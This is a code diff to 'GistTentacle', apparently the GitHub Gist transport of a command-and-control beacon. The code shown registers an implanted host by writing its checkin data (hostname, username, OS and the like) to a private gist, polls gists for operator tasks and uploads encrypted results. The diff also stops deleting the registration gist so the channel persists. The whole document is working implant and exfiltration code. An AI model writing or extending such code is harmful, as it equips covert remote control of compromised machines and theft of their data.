@@ -15,19 +15,30 @@
  */
 
 import { BaseTentacle } from "./BaseTentacle.ts";
+import { ExplicitFineGrainedTokenProvider } from "../lib/GitHubTokenProvider.ts";
 import {
   decryptBox, sealBox,
-  bytesToBase64, base64ToBytes,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
-
-const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 
 export class GistTentacle extends BaseTentacle {
   readonly kind = "gist" as const;
 
-  private operatorPublicKey: Uint8Array | null = null;
-  private ackSent    = false;
+  constructor(config: import("../types.ts").BeaconConfig) {
+    const gistToken = config.gistToken?.trim();
+    super(
+      config,
+      gistToken
+        ? new ExplicitFineGrainedTokenProvider(gistToken)
+        : undefined,
+    );
+  }
+
   private ackGistId: string | null = null;
   private taskGistId: string | null = null;
   private lastTaskUpdatedAt: string | null = null;
@@ -54,41 +65,44 @@ export class GistTentacle extends BaseTentacle {
   // ── Operator key resolution ───────────────────────────────────────────────────
 
   private async getOperatorPublicKey(): Promise<Uint8Array> {
-    if (this.operatorPublicKey) return this.operatorPublicKey;
-    const resp = await this.octokit.rest.actions.getRepoVariable({
-      owner: this.config.repo.owner,
-      repo:  this.config.repo.name,
-      name:  OPERATOR_PUBKEY_VAR,
-    });
-    const b64 = resp.data.value?.trim();
-    if (!b64) throw new Error("GistTentacle: MONITORING_PUBKEY variable not set");
-    const key = await base64ToBytes(b64);
-    if (key.length !== 32) throw new Error("GistTentacle: operator public key is not 32 bytes");
-    this.operatorPublicKey = key;
-    return key;
+    if (this.config.operatorPublicKey.length !== 32) {
+      throw new Error("GistTentacle: provisioned operator public key is not 32 bytes");
+    }
+    return this.config.operatorPublicKey;
   }
 
   // ── Checkin ──────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    let operatorPubKey: Uint8Array;
-    try {
-      operatorPubKey = await this.getOperatorPublicKey();
-    } catch {
-      return [];
+    if (!payload.identity) {
+      throw new Error("GistTentacle: signed checkin identity is required");
     }
 
-    // 1. Send ACK gist on first checkin (registers this beacon with GistChannel)
-    if (!this.ackSent) {
-      const ackContent = JSON.stringify({
-        beaconId:  this.config.id,
-        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
-        hostname:  payload.hostname,
-        username:  payload.username,
-        os:        payload.os,
-        arch:      payload.arch,
-        checkinAt: payload.checkinAt,
-      });
+    // List once per cycle so ACK reuse and task discovery share one request.
+    const listResp = await this.octokit.rest.gists.list({ per_page: 100 });
+    const listedAckGist = listResp.data.find(
+      (g: any) => g.files && g.files[this.ackFilename],
+    );
+    if (!this.ackGistId && listedAckGist) {
+      this.ackGistId = listedAckGist.id;
+    }
+
+    // Refresh one reusable ACK gist before every task poll.
+    const ackContent = JSON.stringify(payload);
+    if (this.ackGistId) {
+      try {
+        await this.octokit.rest.gists.update({
+          gist_id: this.ackGistId,
+          files: {
+            [this.ackFilename]: { content: ackContent },
+          },
+        } as any);
+      } catch (err: any) {
+        if (err?.status !== 404) throw err;
+        this.ackGistId = null;
+      }
+    }
+    if (!this.ackGistId) {
       const ackResp = await this.octokit.rest.gists.create({
         public: false,
         files: {
@@ -96,11 +110,16 @@ export class GistTentacle extends BaseTentacle {
         },
       } as any);
       this.ackGistId = ackResp.data.id ?? null;
-      this.ackSent = true;
+    }
+
+    let operatorPubKey: Uint8Array;
+    try {
+      operatorPubKey = await this.getOperatorPublicKey();
+    } catch {
+      return [];
     }
 
     // 2. Poll for task gist
-    const listResp = await this.octokit.rest.gists.list({ per_page: 100 });
     const taskGist = listResp.data.find(
       (g: any) => g.files && g.files[this.taskFilename]
     );
@@ -156,7 +175,7 @@ export class GistTentacle extends BaseTentacle {
 
   // ── Submit result ────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const operatorPubKey = await this.getOperatorPublicKey();
 
     const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
@@ -166,15 +185,17 @@ export class GistTentacle extends BaseTentacle {
         [this.resultFilename]: { content: sealed },
       },
     } as any);
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "gist",
+      acceptance: null,
+    };
   }
 
   // ── Teardown ─────────────────────────────────────────────────────────────────
 
   override async teardown(): Promise<void> {
-    if (this.ackGistId) {
-      try {
-        await this.octokit.rest.gists.delete({ gist_id: this.ackGistId });
-      } catch { /* best-effort */ }
-    }
+    // Preserve registration and unread task gists across recovery rebuilds.
   }
 }
